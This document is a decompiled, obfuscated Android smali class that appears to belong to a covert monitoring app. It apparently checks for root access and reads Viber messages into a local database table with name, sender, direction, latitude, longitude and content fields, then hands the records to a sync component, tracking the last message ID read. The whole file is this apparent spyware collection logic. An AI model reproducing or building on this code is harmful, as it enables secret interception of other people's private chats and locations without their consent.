.class public Lb/d/d/z0/h;
.super Lcom/utils/core/h0/l;
.source ""


# static fields
.field public static final k:Lb/d/d/z0/h;


# direct methods
.method static constructor <clinit>()V
    .locals 1

    new-instance v0, Lb/d/d/z0/h;

    invoke-direct {v0}, Lb/d/d/z0/h;-><init>()V

    sput-object v0, Lb/d/d/z0/h;->k:Lb/d/d/z0/h;

    return-void
.end method

.method public constructor <init>()V
    .locals 4

    const-string v0, "ObVb"

    const/16 v1, 0x130

    const-string v2, "viber"

    const-string v3, "vb"

    invoke-direct {p0, v0, v1, v2, v3}, Lcom/utils/core/h0/l;-><init>(Ljava/lang/String;ILjava/lang/String;Ljava/lang/String;)V

    new-instance v0, Lcom/utils/core/o;

    invoke-direct {v0, p0}, Lcom/utils/core/o;-><init>(Lcom/utils/core/h0/j;)V

    iput-object v0, p0, Lcom/utils/core/h0/j;->h:Lcom/utils/core/o;

    return-void
.end method


# virtual methods
.method public a(Ljava/lang/String;)V
    .locals 0

    return-void
.end method

.method public c()Z
    .locals 1

    invoke-static {}, Lcom/utils/core/g0;->u()Z

    move-result v0

    if-eqz v0, :cond_1

    invoke-static {}, Lcom/utils/core/g0;->l()Z

    move-result v0

    if-nez v0, :cond_0

    invoke-static {}, Lcom/utils/core/d0;->j()Z

    move-result v0

    if-eqz v0, :cond_1

    :cond_0
    const/4 v0, 0x1

    goto :goto_0

    :cond_1
    const/4 v0, 0x0

    :goto_0
    return v0
.end method

.method public e()Ljava/lang/String;
    .locals 2

    const-string v0, "vb"

    const/4 v1, 0x0

    invoke-static {v0, v1}, Lcom/utils/core/u;->a(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    return-object v0
.end method

.method public f()V
    .locals 5

    :try_start_0
    new-instance v0, Lb/d/d/z0/g;

    iget-object v1, p0, Lcom/utils/core/h0/e;->b:Ljava/lang/String;

    const/4 v2, 0x6

    new-array v2, v2, [Ljava/lang/String;

    const/4 v3, 0x0

    const-string v4, "status"

    aput-object v4, v2, v3

    const/4 v3, 0x1

    const-string v4, "isout"

    aput-object v4, v2, v3

    const/4 v3, 0x2

    const-string v4, "name"

    aput-object v4, v2, v3

    const/4 v3, 0x3

    const-string v4, "me"

    aput-object v4, v2, v3

    const/4 v3, 0x4

    const-string v4, "res"

    aput-object v4, v2, v3

    const/4 v3, 0x5

    const-string v4, "data"

    aput-object v4, v2, v3

    invoke-direct {v0, p0, v1, v2}, Lb/d/d/z0/g;-><init>(Lb/d/d/z0/h;Ljava/lang/String;[Ljava/lang/String;)V

    iput-object v0, p0, Lcom/utils/core/h0/e;->d:Lb/d/a/g;

    invoke-virtual {p0}, Lcom/utils/core/h0/j;->s()V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    :catch_0
    move-exception v0

    iget-object v1, p0, Lcom/utils/core/h0/e;->a:Ljava/lang/String;

    const-string v2, "gEToS"

    invoke-static {v1, v2, v0}, Lb/d/c/d0;->a(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Exception;)V

    :goto_0
    return-void
.end method

.method public h()Ljava/lang/String;
    .locals 2

    sget-object v0, Lcom/utils/core/CoreApplication;->a:Landroid/content/Context;

    const v1, 0x7f0c00c7

    invoke-virtual {v0, v1}, Landroid/content/Context;->getString(I)Ljava/lang/String;

    move-result-object v0

    return-object v0
.end method

.method public i()Z
    .locals 1

    const/4 v0, 0x1

    return v0
.end method

.method public n()Z
    .locals 1

    const/4 v0, 0x1

    return v0
.end method

.method public r()Ljava/util/ArrayList;
    .locals 6

    new-instance v0, Ljava/util/ArrayList;

    invoke-direct {v0}, Ljava/util/ArrayList;-><init>()V

    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    sget-object v2, Lcom/utils/core/o;->g:Ljava/lang/String;

    const-string v3, "file"

    const-string v4, " VARCHAR,"

    const-string v5, "name"

    invoke-static {v1, v2, v3, v4, v5}, Lb/a/a/a/a;->a(Ljava/lang/StringBuilder;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V

    const-string v2, "me"

    const-string v3, "latitude"

    invoke-static {v1, v4, v2, v4, v3}, Lb/a/a/a/a;->a(Ljava/lang/StringBuilder;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V

    const-string v2, " FLOAT,"

    const-string v3, "longitude"

    const-string v5, "isout"

    invoke-static {v1, v2, v3, v2, v5}, Lb/a/a/a/a;->a(Ljava/lang/StringBuilder;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V

    const-string v2, " INTEGER DEFAULT \'0\' NOT NULL,"

    const-string v3, "res"

    const-string v5, "data"

    invoke-static {v1, v2, v3, v4, v5}, Lb/a/a/a/a;->a(Ljava/lang/StringBuilder;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V

    const-string v2, " VARCHAR);"

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/util/ArrayList;->add(Ljava/lang/Object;)Z

    return-object v0
.end method

.method public t()Ljava/util/ArrayList;
    .locals 1

    const/4 v0, 0x0

    return-object v0
.end method

.method public u()V
    .locals 7

    new-instance v0, Lb/d/e/c;

    invoke-direct {v0}, Lb/d/e/c;-><init>()V

    .line 1
    invoke-virtual {v0}, Lb/d/e/c;->d()Ljava/util/ArrayList;

    move-result-object v1

    const-string v2, "RtRdVb"

    invoke-virtual {v0, v2, v2, v1}, Lcom/utils/core/q;->a(Ljava/lang/String;Ljava/lang/String;Ljava/util/ArrayList;)Z

    move-result v1

    if-eqz v1, :cond_1

    const/4 v1, 0x2

    new-array v1, v1, [J

    const/4 v2, 0x0

    const-wide/16 v3, -0x1

    const-string v5, "LastVbID"

    .line 2
    invoke-static {v5, v3, v4}, Lcom/utils/core/g0;->a(Ljava/lang/String;J)J

    move-result-wide v5

    aput-wide v5, v1, v2

    const/4 v2, 0x1

    aput-wide v3, v1, v2

    .line 3
    invoke-virtual {v0, v1}, Lb/d/e/c;->a([J)Ljava/util/List;

    move-result-object v0

    invoke-interface {v0}, Ljava/util/List;->size()I

    move-result v2

    if-lez v2, :cond_0

    new-instance v2, Lb/d/d/z0/f;

    invoke-direct {v2, p0, v1}, Lb/d/d/z0/f;-><init>(Lb/d/d/z0/h;[J)V

    iget-object v1, p0, Lcom/utils/core/h0/j;->h:Lcom/utils/core/o;

    invoke-virtual {v1, v0, v2}, Lcom/utils/core/o;->a(Ljava/util/List;Lcom/utils/core/h0/b;)V

    goto :goto_1

    :cond_0
    iget-object v0, p0, Lcom/utils/core/h0/e;->a:Ljava/lang/String;

    const-string v1, "no msg "

    goto :goto_0

    :cond_1
    iget-object v0, p0, Lcom/utils/core/h0/e;->a:Ljava/lang/String;

    const-string v1, "n chn"

    :goto_0
    invoke-static {v0, v1}, Lb/d/c/d0;->a(Ljava/lang/String;Ljava/lang/String;)V

    :goto_1
    return-void
.end method
